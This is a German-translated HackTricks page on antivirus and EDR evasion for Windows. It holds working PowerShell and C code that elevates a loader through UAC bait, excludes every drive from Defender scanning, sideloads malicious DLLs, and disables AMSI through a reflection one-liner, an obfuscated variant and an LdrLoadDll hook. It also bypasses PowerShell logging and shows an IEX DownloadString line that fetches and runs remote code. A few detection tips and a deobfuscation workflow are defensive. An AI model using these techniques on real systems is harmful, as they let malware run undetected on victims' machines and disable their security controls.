# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Diese Seite wurde verfasst von** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Defender stoppen

- [defendnot](https://github.com/es3n1n/defendnot): Ein Tool, um Windows Defender funktionsunfähig zu machen.
- [no-defender](https://github.com/es3n1n/no-defender): Ein Tool, um Windows Defender funktionsunfähig zu machen, indem es ein anderes AV vortäuscht.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-artiger UAC-Köder, bevor Defender manipuliert wird

Public loaders masquerading as game cheats frequently ship as unsigned Node.js/Nexe installers that first **den Benutzer um Administratorrechte bitten** and only then neuter Defender. The flow is simple:

1. Prüfe auf administrative Rechte mit `net session`. Der Befehl gelingt nur, wenn der Aufrufer Administratorrechte hat; ein Fehlschlag zeigt also an, dass der Loader als Standardbenutzer läuft.
2. Startet sich sofort mit dem `RunAs`-Verb neu, um die erwartete UAC-Zustimmungsaufforderung auszulösen, während die ursprüngliche Kommandozeile erhalten bleibt.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Opfer glauben bereits, dass sie “cracked” Software installieren, daher wird die Eingabeaufforderung in der Regel akzeptiert, wodurch die Malware die Rechte erhält, die sie benötigt, um die Defender-Richtlinie zu ändern.

### Pauschale `MpPreference`-Ausnahmen für jeden Laufwerksbuchstaben

Sobald sie erhöhte Rechte haben, maximieren GachiLoader-style chains die Blindstellen von Defender, anstatt den Dienst vollständig zu deaktivieren. Der Loader beendet zuerst den GUI-Watchdog (`taskkill /F /IM SecHealthUI.exe`) und setzt dann **äußerst breite Ausnahmen**, sodass jedes Benutzerprofil, jedes Systemverzeichnis und jeder Wechseldatenträger nicht mehr gescannt werden kann:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Wichtige Beobachtungen:

- Die Schleife durchläuft jedes eingehängte Dateisystem (D:\, E:\, USB-Sticks, usw.), daher werden **alle später irgendwo auf der Festplatte abgelegten Payloads ignoriert**.
- Die Ausschlussregel für die Erweiterung `.sys` ist vorausschauend – Angreifer behalten sich die Option vor, später unsignierte Treiber zu laden, ohne Defender erneut anzufassen.
- Alle Änderungen landen unter `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, wodurch spätere Stufen prüfen können, ob die Ausnahmen bestehen bleiben oder sie erweitern können, ohne UAC erneut auszulösen.

Da kein Defender-Dienst gestoppt wird, melden naive Health-Checks weiterhin “antivirus active”, obwohl die Echtzeitüberprüfung diese Pfade nie berührt.

## **AV Evasion Methodology**

Aktuell nutzen AVs verschiedene Methoden, um zu prüfen, ob eine Datei bösartig ist: static detection, dynamic analysis und – bei fortgeschritteneren EDRs – behavioural analysis.

### **Static detection**

Static detection erfolgt durch Markierung bekannter bösartiger Strings oder Bytefolgen in einer Binärdatei oder einem Script und durch Extraktion von Informationen aus der Datei selbst (z. B. Dateibeschreibung, Firmenname, digitale Signaturen, Icon, Prüfsumme, etc.). Das bedeutet, dass die Verwendung bekannter öffentlicher Tools dich eher auffliegen lassen kann, da diese wahrscheinlich bereits analysiert und als bösartig markiert wurden. Es gibt mehrere Möglichkeiten, diese Art der Erkennung zu umgehen:

- **Encryption**

  Wenn du die Binärdatei verschlüsselst, kann AV dein Programm nicht erkennen, allerdings brauchst du einen Loader, um es im Speicher zu entschlüsseln und auszuführen.

- **Obfuscation**

  Manchmal reicht es, einige Strings in der Binärdatei oder dem Script zu ändern, um AV zu umgehen, aber das kann je nach Umfang der Obfuskation zeitaufwändig sein.

- **Custom tooling**

  Wenn du eigene Tools entwickelst, gibt es keine bekannten Signaturen, die als schlecht gelten, allerdings erfordert das viel Zeit und Aufwand.

> [!TIP]
> Eine gute Möglichkeit, die static detection von Windows Defender zu überprüfen, ist [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Es teilt die Datei im Grunde in mehrere Segmente und lässt Defender jedes Segment einzeln scannen; so kann es dir genau sagen, welche Strings oder Bytes in deiner Binärdatei markiert sind.

Ich empfehle dringend, dir diese [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) über praktische AV Evasion anzusehen.

### **Dynamic analysis**

Dynamic analysis bedeutet, dass AV deine Binärdatei in einer Sandbox ausführt und nach bösartigem Verhalten sucht (z. B. versucht, Browser-Passwörter zu entschlüsseln und auszulesen, oder einen Minidump von LSASS zu erstellen). Dieser Bereich ist etwas kniffliger, aber hier sind einige Maßnahmen, um Sandboxes zu umgehen.

- **Sleep before execution** Je nach Implementierung kann dies ein guter Weg sein, die dynamic analysis von AV zu umgehen. AVs haben nur sehr wenig Zeit, Dateien zu scannen, um den Nutzer nicht bei der Arbeit zu stören; lange Sleeps können deshalb die Analyse stören. Das Problem ist, dass viele AV-Sandboxes den Sleep je nach Implementierung überspringen können.
- **Checking machine's resources** In der Regel haben Sandboxes nur wenig Ressourcen (< 2GB RAM), sonst würden sie den Rechner des Nutzers verlangsamen. Du kannst hier kreativ werden, z. B. CPU-Temperatur oder Lüfterdrehzahl prüfen – nicht alles ist in der Sandbox implementiert.
- **Machine-specific checks** Wenn du einen Nutzer anvisierst, dessen Workstation zur Domain "contoso.local" gehört, kannst du die Computer-Domain prüfen und bei Nichtübereinstimmung das Programm beenden.

Es stellt sich heraus, dass der Computername der Microsoft Defender-Sandbox HAL9TH ist. Du kannst also vor dem Ausführen in deiner Malware den Computernamen prüfen; entspricht er HAL9TH, befindest du dich in der Defender-Sandbox und kannst das Programm beenden.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Weitere sehr gute Tipps von [@mgeeky](https://twitter.com/mariuszbit) zum Umgang mit Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Wie bereits gesagt, werden **öffentliche Tools** früher oder später **entdeckt**, also solltest du dir eine Frage stellen:

Wenn du z. B. LSASS dumpen willst, **musst du wirklich mimikatz verwenden**? Oder könntest du ein weniger bekanntes Projekt nutzen, das ebenfalls LSASS dumpen kann?

Die richtige Antwort ist vermutlich Letzteres. Am Beispiel von mimikatz: Es ist wahrscheinlich eines der am stärksten von AVs und EDRs markierten Tools; obwohl das Projekt großartig ist, ist es eine Albtraum, damit AVs zu umgehen. Such also nach Alternativen für das, was du erreichen willst.

> [!TIP]
> Wenn du deine Payloads zur Umgehung modifizierst, schalte unbedingt die **automatic sample submission** in Defender aus, und bitte, ernsthaft: **DO NOT UPLOAD TO VIRUSTOTAL**, wenn dein Ziel langfristige Evasion ist. Wenn du prüfen willst, ob ein bestimmter AV deine Payload erkennt, installiere ihn in einer VM, versuche die automatische Sample-Übermittlung auszuschalten und teste dort, bis du zufrieden bist.

## EXEs vs DLLs

Sobald möglich, solltest du immer **prioritize using DLLs for evasion** – nach meiner Erfahrung werden DLL-Dateien in der Regel **way less detected** und analysiert, daher ist das ein einfacher Trick, um in manchen Fällen Erkennung zu vermeiden (sofern dein Payload sich als DLL ausführen lässt).

Wie in diesem Bild zu sehen ist, hat ein DLL-Payload von Havoc bei antiscan.me eine Erkennungsrate von 4/26, während der EXE-Payload eine 7/26-Rate aufweist.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>Vergleich auf antiscan.me eines normalen Havoc EXE-Payloads vs eines normalen Havoc DLL</p></figcaption></figure>

Jetzt zeigen wir einige Tricks, mit denen du DLL-Dateien deutlich stealthiger einsetzen kannst.

## DLL Sideloading & Proxying

DLL Sideloading nutzt die DLL-Suchreihenfolge des Loaders aus, indem die Opferanwendung und die bösartigen Payload(s) nebeneinander positioniert werden.

Du kannst Programme, die für DLL Sideloading anfällig sind, mit [Siofra](https://github.com/Cybereason/siofra) und dem folgenden powershell script prüfen:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Dieser Befehl gibt die Liste der Programme innerhalb von "C:\Program Files\\" aus, die für DLL hijacking anfällig sind, sowie die DLL-Dateien, die sie zu laden versuchen.

Ich empfehle dringend, **erkunde DLL Hijackable/Sideloadable programs selbst**, diese Technik ist bei richtiger Anwendung ziemlich stealthy, aber wenn du öffentlich bekannte DLL Sideloadable programs verwendest, kannst du leicht erwischt werden.

Nur das Platzieren einer malicious DLL mit dem Namen, den ein Programm zu laden erwartet, lädt nicht automatisch dein payload, da das Programm bestimmte Funktionen in dieser DLL erwartet. Um dieses Problem zu lösen, verwenden wir eine weitere Technik namens **DLL Proxying/Forwarding**.

**DLL Proxying** leitet die Aufrufe, die ein Programm an die Proxy-(und malicious-)DLL macht, an die originale DLL weiter, wodurch die Funktionalität des Programms erhalten bleibt und die Ausführung deines payloads gehandhabt werden kann.

Ich werde das Projekt [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) von [@flangvik](https://twitter.com/Flangvik/) verwenden.

Diese Schritte habe ich befolgt:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Der letzte Befehl liefert uns 2 Dateien: eine DLL-Quellcode-Vorlage, und die original umbenannte DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowohl unser shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) als auch die proxy DLL haben eine 0/26 Detection rate in [antiscan.me](https://antiscan.me)! Das würde ich als Erfolg bezeichnen.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ich **empfehle dringend**, dass du dir [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) über DLL Sideloading und auch [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) ansiehst, um mehr über das, was wir besprochen haben, im Detail zu erfahren.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Key behaviors to understand:
- If `TargetDll` is a KnownDLL, it is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).
- If `TargetDll` is not a KnownDLL, the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.

Dies ermöglicht eine indirekte sideloading primitive: finde eine signed DLL, die eine Funktion exportiert, die auf einen non-KnownDLL Modulnamen forwarded, und platziere diese signed DLL zusammen mit einer attacker-controlled DLL im selben Verzeichnis, die genau den Namen des forwarded Zielmoduls trägt. Wenn der forwarded Export aufgerufen wird, löst der loader den Forward auf und lädt deine DLL aus demselben Verzeichnis, wobei deine DllMain ausgeführt wird.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` ist keine KnownDLL, daher wird sie über die normale Suchreihenfolge aufgelöst.

PoC (copy-paste):
1) Kopiere die signierte System-DLL in einen beschreibbaren Ordner
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Lege eine bösartige `NCRYPTPROV.dll` im gleichen Ordner ab. Ein minimales DllMain reicht aus, um Codeausführung zu erreichen; du musst die weitergeleitete Funktion nicht implementieren, um DllMain auszulösen.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Den Forward mit einem signierten LOLBin auslösen:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Beobachtetes Verhalten:
- rundll32 (signed) lädt die side-by-side `keyiso.dll` (signed)
- Beim Auflösen von `KeyIsoSetAuditingInterface` folgt der Loader der Weiterleitung zu `NCRYPTPROV.SetAuditingInterface`
- Der Loader lädt dann `NCRYPTPROV.dll` aus `C:\test` und führt dessen `DllMain` aus
- Falls `SetAuditingInterface` nicht implementiert ist, erhält man den Fehler "missing API" erst nachdem `DllMain` bereits ausgeführt wurde

Tipps zur Erkennung:
- Konzentriere dich auf weitergeleitete Exporte, bei denen das Zielmodul kein KnownDLL ist. KnownDLLs sind aufgeführt unter `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Du kannst weitergeleitete Exporte mit Tools wie z. B. aufzählen:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Siehe das Windows 11 Forwarder-Inventar, um Kandidaten zu suchen: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Überwache LOLBins (z. B. rundll32.exe), die signierte DLLs aus Nicht-Systempfaden laden, gefolgt vom Laden von non-KnownDLLs mit demselben Basisnamen aus diesem Verzeichnis
- Alarm bei Prozess-/Modulketten wie: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` unter benutzerschreibbaren Pfaden
- Erzwinge Codeintegritätsrichtlinien (WDAC/AppLocker) und verweigere Schreib- und Ausführungsrechte in Anwendungsverzeichnissen

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Du kannst Freeze verwenden, um deinen shellcode auf eine unauffällige Weise zu laden und auszuführen.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ist ein Katz-und-Maus-Spiel — was heute funktioniert, kann morgen entdeckt werden. Verlasse dich nie nur auf ein Tool; kombiniere nach Möglichkeit mehrere Evasionstechniken.

## Direkt/Indirekt Syscalls & SSN-Auflösung (SysWhispers4)

EDRs platzieren oft **user-mode inline hooks** auf `ntdll.dll` syscall stubs. Um diese Hooks zu umgehen, kannst du **direct** oder **indirect** syscall stubs erzeugen, die die korrekte **SSN** (System Service Number) laden und in den Kernelmodus wechseln, ohne den gehookten Export-Einstiegspunkt auszuführen.

**Aufrufoptionen:**
- **Direct (embedded)**: fügt eine `syscall`/`sysenter`/`SVC #0`-Anweisung in den generierten Stub ein (kein Aufruf des `ntdll`-Exports).
- **Indirect**: springt in ein vorhandenes `syscall`-Gadget innerhalb von `ntdll`, sodass der Kernel-Übergang scheinbar von `ntdll` ausgeht (nützlich zur Heuristik-Evasion); **randomized indirect** wählt pro Aufruf ein Gadget aus einem Pool.
- **Egg-hunt**: vermeidet das Einbetten der statischen Opcode-Sequenz `0F 05` auf der Festplatte; löst eine syscall-Sequenz zur Laufzeit auf.

**Hook-resistente SSN-Auflösungsstrategien:**
- **FreshyCalls (VA sort)**: leitet SSNs ab, indem syscall-Stubs nach virtueller Adresse sortiert werden statt Stub-Bytes auszulesen.
- **SyscallsFromDisk**: mappe eine saubere `\KnownDlls\ntdll.dll`, lies SSNs aus dessen `.text` und unmappe dann (umgeht alle In-Memory-Hooks).
- **RecycledGate**: kombiniert VA-sortierte SSN-Inferenz mit Opcode-Validierung, wenn ein Stub sauber ist; fällt auf VA-Inferenz zurück, wenn gehookt.
- **HW Breakpoint**: setze DR0 auf die `syscall`-Anweisung und verwende einen VEH, um die SSN zur Laufzeit aus `EAX` zu erfassen, ohne gehookte Bytes zu parsen.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI wurde eingeführt, um "fileless malware" zu verhindern. Ursprünglich konnten AVs nur **Dateien auf der Festplatte** scannen; wenn man Payloads **direkt im Speicher** ausführen konnte, hatte das AV keine Möglichkeit, dies zu verhindern, da es nicht genügend Einsicht hatte.

Die AMSI-Funktion ist in diese Windows-Komponenten integriert.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Sie ermöglicht Antivirus-Lösungen, das Verhalten von Scripts zu inspizieren, indem Script-Inhalte in einer Form offengelegt werden, die weder verschlüsselt noch obfuskiert ist.

Das Ausführen von `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` erzeugt die folgende Meldung in Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Beachte, wie es `amsi:` voranstellt und dann den Pfad zur ausführbaren Datei angibt, aus der das Script ausgeführt wurde — in diesem Fall powershell.exe

Wir haben keine Datei auf die Festplatte geschrieben, wurden aber trotzdem im Speicher erwischt wegen AMSI.

Außerdem werden ab **.NET 4.8** auch C#-Code durch AMSI geprüft. Das betrifft sogar `Assembly.Load(byte[])` für in-memory Ausführung. Deshalb wird empfohlen, für in-memory Ausführung niedrigere .NET-Versionen (z. B. 4.7.2 oder älter) zu verwenden, wenn man AMSI umgehen möchte.

Es gibt einige Möglichkeiten, AMSI zu umgehen:

- **Obfuscation**

Da AMSI hauptsächlich mit statischen Detections arbeitet, kann das Modifizieren der Scripts, die man laden will, eine gute Methode zum Umgehen von Erkennungen sein.

Allerdings ist AMSI in der Lage, Scripts zu deobfuskieren, selbst wenn mehrere Schichten vorhanden sind, daher kann Obfuscation je nach Umsetzung eine schlechte Option sein. Das macht das Umgehen nicht ganz einfach. Manchmal reicht es aber, ein paar Variablennamen zu ändern, und alles ist gut — es hängt also davon ab, wie stark etwas markiert wurde.

- **AMSI Bypass**

Da AMSI durch das Laden einer DLL in den powershell-Prozess (ebenfalls cscript.exe, wscript.exe usw.) implementiert ist, lässt sich daran auch als nicht-privilegierter Benutzer relativ einfach manipulieren. Aufgrund dieses Implementierungsfehlers haben Forscher mehrere Methoden entdeckt, AMSI-Scans zu umgehen.

**Forcing an Error**

Das Erzwingen eines Fehlers bei der AMSI-Initialisierung (amsiInitFailed) führt dazu, dass für den aktuellen Prozess kein Scan gestartet wird. Ursprünglich wurde dies von [Matt Graeber](https://twitter.com/mattifestation) veröffentlicht, und Microsoft hat eine Signatur entwickelt, um eine breitere Nutzung zu verhindern.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Es genügte eine einzige Zeile powershell-Code, um AMSI für den aktuellen powershell-Prozess unbrauchbar zu machen. Diese Zeile wurde natürlich von AMSI selbst erkannt, daher sind einige Änderungen nötig, um diese Technik anwenden zu können.

Hier ist ein modifizierter AMSI bypass, den ich von diesem [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) übernommen habe.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Diese Technik wurde ursprünglich von [@RastaMouse](https://twitter.com/_RastaMouse/) entdeckt und besteht darin, die Adresse der Funktion "AmsiScanBuffer" in amsi.dll (verantwortlich für das Scannen der vom Benutzer gelieferten Eingabe) zu finden und sie mit Instruktionen zu überschreiben, die den Code E_INVALIDARG zurückgeben. Auf diese Weise liefert der tatsächliche Scan 0, was als sauberes Ergebnis interpretiert wird.

> [!TIP]
> Please read [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) for a more detailed explanation.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### AMSI blockieren, indem das Laden von amsi.dll verhindert wird (LdrLoadDll hook)

AMSI wird erst initialisiert, nachdem `amsi.dll` in den aktuellen Prozess geladen wurde. Ein robuster, sprachunabhängiger Bypass besteht darin, einen User‑Mode‑Hook auf `ntdll!LdrLoadDll` zu setzen, der einen Fehler zurückgibt, wenn das angeforderte Modul `amsi.dll` ist. Infolgedessen wird AMSI nie geladen und es finden für diesen Prozess keine Scans statt.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Funktioniert sowohl mit PowerShell, WScript/CScript als auch mit benutzerdefinierten Loadern (alles, was sonst AMSI laden würde).
- Kombiniere es mit dem Einlesen von Skripten über stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), um lange Kommandozeilenartefakte zu vermeiden.
- Wird häufig von Loadern verwendet, die über LOLBins ausgeführt werden (z. B. `regsvr32`, das `DllRegisterServer` aufruft).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**Die erkannte Signatur entfernen**

Du kannst Tools wie **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** und **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** verwenden, um die erkannte AMSI‑Signatur aus dem Speicher des aktuellen Prozesses zu entfernen. Diese Tools scannen den Speicher des aktuellen Prozesses nach der AMSI‑Signatur und überschreiben sie dann mit NOP‑Instruktionen, wodurch sie effektiv aus dem Speicher entfernt wird.

**AV/EDR‑Produkte, die AMSI verwenden**

Eine Liste von AV/EDR‑Produkten, die AMSI verwenden, findest du in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**PowerShell Version 2 verwenden**
Wenn du PowerShell Version 2 verwendest, wird AMSI nicht geladen, sodass du deine Skripte ausführen kannst, ohne von AMSI gescannt zu werden. Du kannst dies tun:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging ist eine Funktion, mit der Sie alle auf einem System ausgeführten PowerShell‑Befehle protokollieren können. Das ist nützlich für Auditing und Fehlerbehebung, kann aber auch ein **Problem für Angreifer darstellen, die der Erkennung entgehen wollen**.

Um PowerShell logging zu umgehen, können Sie die folgenden Techniken verwenden:

- **Disable PowerShell Transcription and Module Logging**: Dafür können Sie ein Tool wie [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) verwenden.
- **Use Powershell version 2**: Wenn Sie PowerShell Version 2 verwenden, wird AMSI nicht geladen, sodass Sie Ihre Skripte ausführen können, ohne von AMSI gescannt zu werden. Sie können dies tun: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Verwenden Sie [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), um eine PowerShell‑Session ohne Schutzmechanismen zu starten (das ist das, was `powerpick` von Cobalt Strike verwendet).


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Bei der Analyse von Malware, die ConfuserEx 2 (oder kommerzielle Forks) verwendet, trifft man häufig auf mehrere Schutzschichten, die Decompiler und Sandboxes blockieren. Der folgende Workflow stellt zuverlässig ein nahezu originales IL wieder her, das anschließend in C# mit Tools wie dnSpy oder ILSpy dekompiliert werden kann.

1.  Anti-tampering removal – ConfuserEx verschlüsselt jeden *method body* und entschlüsselt ihn im *module* statischen Konstruktor (`<Module>.cctor`). Dies patcht auch die PE‑Prüfsumme, sodass jede Modifikation die Binärdatei zum Absturz bringen kann. Verwenden Sie **AntiTamperKiller**, um die verschlüsselten Metadatentabellen zu finden, die XOR‑Schlüssel wiederherzustellen und eine saubere Assembly neu zu schreiben:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Die Ausgabe enthält die 6 Anti‑Tamper‑Parameter (`key0-key3`, `nameHash`, `internKey`), die beim Erstellen eines eigenen Unpackers nützlich sein können.

2.  Symbol / control-flow recovery – geben Sie die *clean* Datei an **de4dot-cex** weiter (ein ConfuserEx‑awarer Fork von de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – wählt das ConfuserEx 2 Profil  
• de4dot wird control-flow flattening rückgängig machen, originale Namespaces, Klassen und Variablennamen wiederherstellen und konstante Strings entschlüsseln.

3.  Proxy-call stripping – ConfuserEx ersetzt direkte Methodenaufrufe durch leichte Wrapper (a.k.a *proxy calls*), um die Dekompilierung weiter zu erschweren. Entfernen Sie diese mit **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nach diesem Schritt sollten Sie normale .NET‑APIs wie `Convert.FromBase64String` oder `AES.Create()` anstelle von undurchsichtigen Wrapper‑Funktionen (`Class8.smethod_10`, …) sehen.

4.  Manual clean-up – führen Sie die resultierende Binärdatei in dnSpy aus, suchen Sie nach großen Base64‑Blobs oder der Verwendung von `RijndaelManaged`/`TripleDESCryptoServiceProvider`, um die *wirkliche* Payload zu lokalisieren. Oft speichert die Malware sie als TLV‑kodiertes Byte‑Array, das in `<Module>.byte_0` initialisiert ist.

Die obige Kette stellt den Ausführungsfluss **wieder her, ohne** dass das bösartige Sample ausgeführt werden muss – nützlich bei der Arbeit an einer Offline‑Workstation.

> 🛈  ConfuserEx erzeugt ein benutzerdefiniertes Attribut namens `ConfusedByAttribute`, das als IOC verwendet werden kann, um Samples automatisch zu triagieren.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ziel dieses Projekts ist es, einen Open-Source-Fork der [LLVM](http://www.llvm.org/) Kompilierungs-Suite bereitzustellen, der erhöhte Softwaresicherheit durch [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) und tamper-proofing bietet.
